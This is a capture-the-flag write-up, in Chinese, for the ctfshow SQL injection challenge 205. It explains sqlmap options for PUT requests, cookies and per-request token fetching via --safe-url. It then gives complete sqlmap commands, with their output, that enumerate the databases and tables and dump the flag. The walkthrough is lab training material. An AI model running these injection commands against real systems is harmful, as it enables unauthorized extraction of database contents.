## ctfshow-sql205

#####  sqlmap的使用手册: https://github.com/sqlmapproject/sqlmap/wiki/Usage

#####  比较详细的使用教程 : https://www.freebuf.com/sectool/164608.html



```
 要求：
 api调用需要鉴权
```



```mysql
查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where id = '".$_GET['id']."';";

返回逻辑
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```



```shell
–user-agent=AGENT 默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(http://sqlmap.org)可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入
–-referer=REFERER sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入
使用–-data 调整sqlmap的请求方式
--data即为post请求
使用--method 调整sqlmap的请求方式
--method强制使用给定的HTTP方法（例如put）
注意：一定要加上–headers=“Content-Type: text/plain” ，否则是按表单(form)提交的，put接收不到
使用--cookie 调整sqlmap的cookie
cookie=COOKIE     HTTP Cookieheader 值
使用--safe-url 调整sqlmap的访问方式
 --safe-url=SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下
 使用--safe-url 调整sqlmap的访问请求次数
 --safe-freq=SAFE..  测试一个给定安全网址的访问请求次数
```



```
注入顺序
1.获取当前MySQL中的所有数据库
2.获取当前数据库名字
3.获取数据库下的数据表
4.获取表下的列名
5.导出数据
```



```mysql
layui.use('form', function(){
  var form = layui.form;
  form.on('submit(*)', function(data){
    $.ajax({
      url:'api/getToken.php'
    });
    var id = data.field['id'];
    var table = layui.table;
    table.reload('user_table', {
      url:'api/?id='+id
    })
    return false; //阻止表单跳转。如果需要表单跳转，去掉这段即可。
  });


通过抓包分析，在每次请求url/api/index.php之前需要先请求URL/api/getTokn.php
请求index.php之前还会请求一次getToken.php，也就是说每注入一次，要先访问一次getToken.php


–-safe-url 设置在测试目标地址前访问的安全链接
–-safe-freq 设置两次注入测试前访问安全链接的次数






查询数据库

sqlmap.py -u http://0119fe9c-992a-4fe8-8681-f1416a833ecc.chall.ctf.show:8080/api/index.php --method=PUT --data="id=1" --headers="content-type:text/plain" --referer="ctf.show" --cookie="UM_distinctid=177dbc429491f1-0b465ef853f053-53e356a-15f900-177dbc4294aa66; PHPSESSID=nk1prkkmr84augpja8u36e5q58; td_cookie=1672310416" --safe-url="http://0119fe9c-992a-4fe8-8681-f1416a833ecc.chall.ctf.show:8080/api/getToken.php" --safe-freq=1 --dbs

[09:02:22] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.11, Nginx 1.16.1
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:02:22] [INFO] fetching database names
available databases [5]:
[*] ctfshow_web
[*] information_schema
[*] mysql
[*] performance_schema
[*] test


查表
sqlmap.py -u http://0119fe9c-992a-4fe8-8681-f1416a833ecc.chall.ctf.show:8080/api/index.php --method=PUT --data="id=1" --headers="content-type:text/plain" --referer="ctf.show" --cookie="UM_distinctid=177dbc429491f1-0b465ef853f053-53e356a-15f900-177dbc4294aa66; PHPSESSID=nk1prkkmr84augpja8u36e5q58; td_cookie=1672310416" --safe-url="http://0119fe9c-992a-4fe8-8681-f1416a833ecc.chall.ctf.show:8080/api/getToken.php" --safe-freq=1 -D ctfshow_web --tables

[09:02:52] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.11, Nginx 1.16.1
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:02:52] [INFO] fetching tables for database: 'ctfshow_web'
Database: ctfshow_web
[2 tables]
+--------------+
| ctfshow_flax |
| ctfshow_user |
+--------------+


查列名
sqlmap.py -u http://0119fe9c-992a-4fe8-8681-f1416a833ecc.chall.ctf.show:8080/api/index.php --method=PUT --data="id=1" --headers="content-type:text/plain" --referer="ctf.show" --cookie="UM_distinctid=177dbc429491f1-0b465ef853f053-53e356a-15f900-177dbc4294aa66; PHPSESSID=nk1prkkmr84augpja8u36e5q58; td_cookie=1672310416" --safe-url="http://0119fe9c-992a-4fe8-8681-f1416a833ecc.chall.ctf.show:8080/api/getToken.php" --safe-freq=1 -D ctfshow_web -T ctfshow-flax --columns

[09:03:55] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.11, Nginx 1.16.1
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:03:55] [INFO] fetching columns for table 'ctfshow_flax' in database 'ctfshow_web'
Database: ctfshow_web
Table: ctfshow_flax
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flagx  | varchar(255) |
| id     | int(11)      |
| tes    | varchar(255) |
+--------+--------------+

查内容
sqlmap.py -u http://0119fe9c-992a-4fe8-8681-f1416a833ecc.chall.ctf.show:8080/api/index.php --method=PUT --data="id=1" --headers="content-type:text/plain" --referer="ctf.show" --cookie="UM_distinctid=177dbc429491f1-0b465ef853f053-53e356a-15f900-177dbc4294aa66; PHPSESSID=nk1prkkmr84augpja8u36e5q58; td_cookie=1672310416" --safe-url="http://0119fe9c-992a-4fe8-8681-f1416a833ecc.chall.ctf.show:8080/api/getToken.php" --safe-freq=1 -D ctfshow_web -T ctfshow-flax --dump


[09:04:39] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.11, Nginx 1.16.1
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:04:39] [INFO] fetching columns for table 'ctfshow_flax' in database 'ctfshow_web'
[09:04:39] [INFO] fetching entries for table 'ctfshow_flax' in database 'ctfshow_web'
Database: ctfshow_web
Table: ctfshow_flax
[1 entry]
+----+---------+-----------------------------------------------+
| id | tes     | flagx                                         |
+----+---------+-----------------------------------------------+
| 1  | you win | ctfshow{c8ed51f1-c317-4f3c-8ac8-5f5f8cc69aa0} |
+----+---------+-----------------------------------------------+
```

